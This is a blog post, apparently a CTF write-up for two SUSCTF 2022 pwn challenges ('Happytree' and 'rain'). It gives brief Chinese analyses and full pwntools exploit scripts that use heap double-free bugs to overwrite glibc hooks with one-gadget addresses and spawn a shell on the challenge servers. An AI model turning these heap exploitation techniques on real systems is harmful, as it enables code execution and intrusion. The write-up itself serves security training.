{"title":"SUSCTF pwn wp","date":"2022-03-01T07:46:32.000Z","toc":true,"source":"_posts/SUSCTF-wp.md","raw":"---\ntitle: \"SUSCTF pwn wp\" \ncomments: true\ntoc: true\ndate: 2022-03-01 15:46:32\ntags: \n  - Pwn\n  - SUSCTF\n  - CTF\n\n---\n\n# Happytree\n\n## 题目附件\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/happytree.zip\n\n## 分析\n\n漏洞点在C++的new和delete不对堆空间进行初始化，并且delete逻辑中存在指针未清零的情况，而且存在有符号整数和无符号整数混淆，构造payload泄露main_arena和堆地址后，利用libc-2.27构造tcache的doublefree，最后new出__malloc_hook地址，写入ogg获得shell\n\n## exp\n\n```python\nfrom pwn import *\nimport ctypes\nimport time\n\n# io = process(['./ld-2.27.so','./happytree'], env={'LD_PRELOAD': './libc.so.6'})\nio = remote('124.71.147.225', 9999)\nelf = ELF('./happytree')\nlibc = ELF('./libc.so.6')\ncontext.log_level = 'debug'\n\nidx = []\n\ndef add(data,content):\n    global root\n    io.sendlineafter('cmd> ','1')\n    io.sendlineafter(\"data: \",str(data))\n    io.sendlineafter(\"content: \",content)\n    idx.append(data)\n    \ndef add1(data,content):\n    io.sendlineafter('cmd> ','1')\n    io.sendlineafter(\"data: \",str(data))\n    io.sendafter(\"content: \",content)\n    idx.append(data)\n\ndef add2(data,content):\n    io.sendlineafter('cmd> ','1')\n    io.sendafter(\"data: \",str(data))\n\ndef free(data):\n    io.sendlineafter('cmd> ','2')\n    io.sendlineafter(\"data: \",str(data))\n    if data in idx:\n        del idx[idx.index(data)]\n\ndef show(data):\n    io.sendlineafter('cmd> ','3')\n    io.sendlineafter(\"data: \",str(data))\n\nread_got = elf.got['read']\nread_plt = elf.plt['read']\n\ndef to_size(size):\n    return (ctypes.c_int(0xffffff00 | size)).value\n\ndef inv(x):\n    return ctypes.c_int(x).value\n\n# add(0x80 | 0x200, 'aaaa')\n# add(0x80 | 0x100, 'aaaa')\n# add(0x80 | 0x300, 'aaaa')\n# free(0x80 | 0x200)\n# for i in range(8):\nadd(inv(0x80 | (0xfff00000)), 'aaaa')\nadd(0x80 | (1*0x100), 'aaaa')\nadd(0x80 | (2*0x100), 'aaaa')\nadd(0x80 | (3*0x100), 'aaaa')\nadd(0x80 | (4*0x100), 'aaaa')\nadd(0x80 | (5*0x100), 'aaaa')\nadd(0x80 | (6*0x100), 'aaaa')\nadd(0x80 | (7*0x100), 'aaaa')\nadd(0x80 | (8*0x100), 'aaaa')\n# add(0x80 | (9*0x100), 'aaaa')\n# add(0x80 | (10*0x100), 'aaaa')\n\nadd(inv(0x80 | (0xff000000)), 'aaaa')\n\n# free(0x80 | (10*0x100))\n# free(0x80 | (8*0x100))\nfree(0x80 | (8*0x100))\nfree(0x80 | (7*0x100))\nfree(0x80 | (6*0x100))\nfree(0x80 | (5*0x100))\nfree(0x80 | (4*0x100))\nfree(0x80 | (3*0x100))\nfree(0x80 | (2*0x100))\nfree(0x80 | (1*0x100))\n\nadd(inv(0x80 | 0xffff0100), 'aaaa')\nadd(inv(0x80 | 0xffff0200), 'aaaa')\nadd(inv(0x80 | 0xffff0300), 'aaaa')\nadd(inv(0x80 | 0xffff0400), 'aaaa')\nadd(inv(0x80 | 0xffff0500), 'aaaa')\nadd(inv(0x80 | 0xffff0600), 'aaaa')\nadd(inv(0x80 | 0xffff0700), 'aaaa')\n# show(0x80 | 0x700)\n# gdb.attach(io)\n\nadd1(inv(0x80 | 0xffff0800), 'a'*8)\nshow(inv(0x80 | 0xffff0800))\nio.recvuntil('content: aaaaaaaa')\ninp = io.recvuntil('\\x7f').ljust(8, '\\x00')\ninp = u64(inp)\nlog.info(hex(inp))\nmain_arena = inp - 96\nlog.info(hex(main_arena))\nlibc_base = main_arena - 0x00003EBC40\nlog.info(hex(libc_base))\n\nfree(inv(0x80 | 0xffff0700))\nfree(inv(0x80 | 0xffff0800))\nadd(0x20 | 0x100, 'a'*23)\nshow(0x20 | 0x100)\n\nio.recvuntil('\\n')\nhp = io.recvuntil('\\n', drop=True).ljust(8, '\\x00')\nhp = u64(hp)\nlog.info(hex(hp))\n\nfree(0x20 | 0x100)\nadd(inv(0x80 | 0xf0000000), 'aaaa')\nadd(inv(0x80 | 0xffff0700), 'aaaa')\nfree(inv(0x80 | 0xf0000000))\nfree(0)\n\nogg = [0x4f365,0x4f3c2,0x10a45c]\n\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\np = p64(malloc_hook)\nadd1(0x80 | ((hp - (hp & 0xff)) & 0xffffffff), p)\nprint hex(0x80 | ((hp - (hp & 0xff)) & 0xffffffff))\n\ntime.sleep(4)\nadd1(0x80 | 0x100, 'aaaa')\np = p64(ogg[2] + libc_base)\nadd1(0x80 | 0x5000, p)\n# gdb.attach(io)\nadd2(0x80 | 0x6000, p)\n# free(inv(0x80 | 0xffff0400))\n\n# print idx\n\n\n\n# add(to_size(0x80 | 0x100))\n\nio.interactive()\n# print hex(to_size(10))\n\n```\n\n# rain\n\n## 题目附件\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/rain.zip\n\n## 分析\n\n当realloc(ptr, 0)时，函数返回null，v7==0过不了if判断，故不会将指针清零，可以构造doublefree，利用doublefree和printf%s泄露在bss段上的_IO_2_1_stdout_地址，即可知道libc基址，最后向__free_hook写入ogg即可getshell\n\n![image-20220301155642358](SUSCTF-wp/image-20220301155642358.png)\n\n## exp\n\n```python\nfrom pwn import *\n\ncontext.log_level='DEBUG'\n# io = process(['./ld-2.27.so','./rain'], env={'LD_PRELOAD': './libc.so.6', \"TERM\":\"xterm\"})\nio = remote('124.71.185.75',9999)\n\ne = ELF('./rain')\nlibc = ELF('./libc.so.6')\n\ndef frame(sh, sw, font, color, rainfall, table1):\n    p = p32(sh)\n    p += p32(sw)\n    p += p8(font)\n    p += p8(color)\n    p += p32(rainfall)\n    p += p32(0xdeadbeaf)\n    p += table1\n    return p\n\n\ndef config(fra):\n    io.sendlineafter('ch> ', '1')\n    io.sendafter('FRAME> ', fra)\n\n\ndef show():\n    io.sendlineafter('ch> ', '2')\n\ndef rain():\n    context.log_level='INFO'\n    io.sendlineafter('ch> ', '3')\n    io.recvuntil('\\n')\n    context.log_level='debug'\np = frame(0x30,0x30,3,4,1,'a'*0x20)\nconfig(p)\np = frame(0x30,0x30,3,4,1,'')\nconfig(p)\np = frame(0x30,0x30,3,4,1,'')\nconfig(p)\n\nmalloc_got = e.got['malloc']\nlog.info(hex(malloc_got))\n\np1 = p64(0x00000603000)\np1 += 'a'*(0x20 - len(p1))\np = frame(0x30,0x30,3,4,1, p1)\nconfig(p)\nrain()\n# show()\n\np = frame(0x30,0x30,3,4,1, 'a'*0x20)\nconfig(p)\nshow()   \n\nio.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\ninp = io.recvuntil('\\n', drop=True).ljust(8, '\\x00')\ninp = u64(inp)\nlog.info(\"_IO_2_1_stdout_:\"+hex(inp))\nlibc_base = inp - libc.sym['_IO_2_1_stdout_']\nlog.info(\"libc_base:\"+hex(libc_base))\n\nogg = [0x4f365,0x4f3c2,0x10a45c]\nmalloc_hook = libc_base + libc.sym['__free_hook']\nlog.info(\"malloc_hook:\"+hex(malloc_hook))\n\n\nrain()\np = frame(0x40,0x40,3,4,1,'a'*0x70)\nconfig(p)\np = frame(0x40,0x40,3,4,1,'')\nconfig(p)\np = frame(0x40,0x40,3,4,1,'')\nconfig(p)\n\np1 = p64(malloc_hook)\np1 += 'a'*(0x70 - len(p1))\np = frame(0x30,0x30,3,4,1, p1)\nconfig(p)\nrain()\n\np = frame(0x30,0x30,3,4,1, 'a'*0x70)\nconfig(p)\nrain()\n\nlog.info(\"ogg:\"+hex(ogg[0]+libc_base))\np1 = p64(ogg[1]+libc_base) * (0x70 // 8)\np = frame(0x1,0x1,3,4,1, p1)\n# gdb.attach(io)\nconfig(p)\np = frame(0x1,0x1,3,4,1,'')\nconfig(p)\n\n# gdb.attach(io)\n\n\n\nio.interactive()\n```\n\n\n\n","slug":"SUSCTF-wp","published":true,"updated":"2025-10-28T08:00:40.756Z","_id":"cuidts4DncG5fOCHjVB1BR8J9","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"Happytree\"><a href=\"#Happytree\" class=\"headerlink\" title=\"Happytree\"></a>Happytree</h1><h2 id=\"题目附件\"><a href=\"#题目附件\" class=\"headerlink\" title=\"题目附件\"></a>题目附件</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/happytree.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/happytree.zip</a></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>漏洞点在C++的new和delete不对堆空间进行初始化，并且delete逻辑中存在指针未清零的情况，而且存在有符号整数和无符号整数混淆，构造payload泄露main_arena和堆地址后，利用libc-2.27构造tcache的doublefree，最后new出__malloc_hook地址，写入ogg获得shell</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> ctypes</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./happytree&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;124.71.147.225&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./happytree&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">idx = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">data,content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> root</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content: &quot;</span>,content)</span><br><span class=\"line\">    idx.append(data)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add1</span>(<span class=\"params\">data,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;content: &quot;</span>,content)</span><br><span class=\"line\">    idx.append(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">data,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data <span class=\"keyword\">in</span> idx:</span><br><span class=\"line\">        <span class=\"keyword\">del</span> idx[idx.index(data)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">to_size</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (ctypes.c_int(<span class=\"number\">0xffffff00</span> | size)).value</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ctypes.c_int(x).value</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | 0x200, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | 0x100, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | 0x300, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># free(0x80 | 0x200)</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(8):</span></span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | (<span class=\"number\">0xfff00000</span>)), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">1</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">2</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">3</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">4</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">5</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">6</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">7</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">8</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | (9*0x100), &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | (10*0x100), &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | (<span class=\"number\">0xff000000</span>)), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># free(0x80 | (10*0x100))</span></span><br><span class=\"line\"><span class=\"comment\"># free(0x80 | (8*0x100))</span></span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">8</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">7</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">6</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">5</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">4</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">3</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">2</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">1</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0200</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0300</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0400</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0500</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0600</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0700</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># show(0x80 | 0x700)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add1(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0800</span>), <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">show(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0800</span>))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;content: aaaaaaaa&#x27;</span>)</span><br><span class=\"line\">inp = io.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">inp = u64(inp)</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(inp))</span><br><span class=\"line\">main_arena = inp - <span class=\"number\">96</span></span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\">libc_base = main_arena - <span class=\"number\">0x00003EBC40</span></span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">free(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0700</span>))</span><br><span class=\"line\">free(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0800</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x20</span> | <span class=\"number\">0x100</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">23</span>)</span><br><span class=\"line\">show(<span class=\"number\">0x20</span> | <span class=\"number\">0x100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">hp = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">hp = u64(hp)</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(hp))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0x20</span> | <span class=\"number\">0x100</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xf0000000</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0700</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xf0000000</span>))</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f365</span>,<span class=\"number\">0x4f3c2</span>,<span class=\"number\">0x10a45c</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc_base + libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">p = p64(malloc_hook)</span><br><span class=\"line\">add1(<span class=\"number\">0x80</span> | ((hp - (hp &amp; <span class=\"number\">0xff</span>)) &amp; <span class=\"number\">0xffffffff</span>), p)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(<span class=\"number\">0x80</span> | ((hp - (hp &amp; <span class=\"number\">0xff</span>)) &amp; <span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">time.sleep(<span class=\"number\">4</span>)</span><br><span class=\"line\">add1(<span class=\"number\">0x80</span> | <span class=\"number\">0x100</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">p = p64(ogg[<span class=\"number\">2</span>] + libc_base)</span><br><span class=\"line\">add1(<span class=\"number\">0x80</span> | <span class=\"number\">0x5000</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">add2(<span class=\"number\">0x80</span> | <span class=\"number\">0x6000</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># free(inv(0x80 | 0xffff0400))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print idx</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(to_size(0x80 | 0x100))</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\"># print hex(to_size(10))</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"rain\"><a href=\"#rain\" class=\"headerlink\" title=\"rain\"></a>rain</h1><h2 id=\"题目附件-1\"><a href=\"#题目附件-1\" class=\"headerlink\" title=\"题目附件\"></a>题目附件</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/rain.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/rain.zip</a></p>\n<h2 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>当realloc(ptr, 0)时，函数返回null，v7&#x3D;&#x3D;0过不了if判断，故不会将指针清零，可以构造doublefree，利用doublefree和printf%s泄露在bss段上的_IO_2_1_stdout_地址，即可知道libc基址，最后向__free_hook写入ogg即可getshell</p>\n<p><img src=\"/p/SUSCTF-wp/image-20220301155642358.png\" alt=\"image-20220301155642358\"></p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span 